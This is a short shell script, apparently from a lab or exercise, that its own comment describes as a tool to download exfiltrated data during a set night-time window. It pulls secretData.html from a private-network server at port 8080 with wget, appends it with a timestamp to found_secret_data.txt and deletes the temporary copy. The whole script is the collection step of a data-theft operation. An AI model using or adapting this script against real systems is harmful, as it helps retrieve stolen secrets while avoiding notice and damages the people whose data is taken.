"""
Use this to download the exfiled data
Download between 1:30 and 2:30 am
"""
ip=172.25.0.3
data="found_secret_data.txt"
echo '\n' $(date) '\n' >> $data
wget -O new.txt http://$ip:8080/secretData.html 
cat "new.txt" >> $data
rm new.txt